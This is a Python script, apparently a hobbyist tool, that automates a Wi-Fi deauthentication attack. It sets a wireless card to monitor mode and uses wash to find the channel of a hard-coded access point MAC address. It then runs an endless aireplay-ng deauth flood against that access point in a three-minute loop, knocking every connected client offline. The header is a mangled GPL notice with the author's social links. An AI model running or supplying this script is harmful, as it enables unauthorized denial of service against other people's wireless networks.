'''
                     GENERAL PUBLIC LICENSE
                     Version 2, 8 jan 2024

 Copyright (C) 2024 Free Everyone is permitted to copy and distribute
 verbatim copies of this license document, but changing it is not allowed.

this tool ws made by sofyane bentaleb for fun 
facebook: https://web.facebook.com/sefyan.yalis
isntagram : https://www.instagram.com/s.f.n_term
github : https://github.com/sefyan0hack
linkedin " https://www.linkedin.com/in/kritos-yt-090a22273/

'''

import json
import time
import subprocess
bssid = 'B0:0A:D5:40:CF:3E'#'BC:2E:F6:60:31:97'
card = "wlan1"
def prepear():
    subprocess.run(['rfkill','unblock','wifi'])
    subprocess.run(['rfkill','unblock','all'])
    subprocess.run(['ifconfig',card,'down'])
    subprocess.run(['iwconfig',card,'mode','monitor'])
    subprocess.run(['ifconfig',card,'up'])
def dumpdata():
    strdata = subprocess.run(['timeout','7','wash','-i',card,'-j','-a'],stdout=subprocess.PIPE).stdout.decode()
    json_objects = strdata.strip().split('\n')
    return json_objects

def Channel(json_objects):
    channel = 0
    for json_obj in json_objects:
        obj = json.loads(json_obj)
        if obj.get("bssid") == bssid:
            channel = obj.get("channel")
            break
    return channel

def Essid(json_objects):
    essid = 'Essid'
    for json_obj in json_objects:
        obj = json.loads(json_obj)
        if obj.get("bssid") == bssid:
            essid = obj.get("essid")
            break
    return essid

def main():
    while True:
        prepear()
        data = dumpdata()
        subprocess.run(['airmon-ng','check','kill'])
        print(f'Wireless: {Essid(data)} Channel: {Channel(data)} MAC: {bssid}')
        subprocess.run(['iwconfig',card,'channel',f'{Channel(data)}'])
        subprocess.Popen(['aireplay-ng','--deauth','0','-a',bssid,card],stdout=subprocess.PIPE)
        time.sleep(60*3)
        print("------------------------------------------------------------------------")
        subprocess.run(['killall','aireplay-ng'])

if __name__ == "__main__":
    main()
